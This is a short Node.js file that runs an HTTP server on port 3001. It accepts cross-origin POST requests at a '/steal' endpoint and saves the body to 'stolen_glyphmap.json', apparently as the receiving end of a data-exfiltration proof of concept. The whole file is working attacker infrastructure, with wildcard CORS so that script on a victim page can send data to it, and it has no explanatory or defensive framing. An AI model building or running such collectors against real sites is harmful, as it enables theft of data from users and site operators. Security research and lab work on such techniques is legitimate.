import http from 'http';
import fs from 'fs';

const server = http.createServer((req, res) => {
  res.setHeader('Access-Control-Allow-Origin', '*');
  res.setHeader('Access-Control-Allow-Methods', 'POST, OPTIONS');
  res.setHeader('Access-Control-Allow-Headers', 'Content-Type');

  if (req.method === 'OPTIONS') {
    res.writeHead(204);
    res.end();
    return;
  }

  if (req.method === 'POST' && req.url === '/steal') {
    let body = '';
    req.on('data', chunk => {
      body += chunk.toString();
    });
    req.on('end', () => {
      fs.writeFileSync('stolen_glyphmap.json', body);
      console.log('Received glyphMap! Wrote to stolen_glyphmap.json');
      res.writeHead(200);
      res.end('ok');
      process.exit(0);
    });
  }
});

server.listen(3001, () => {
  console.log('Listening on port 3001 for glyphMap...');
});
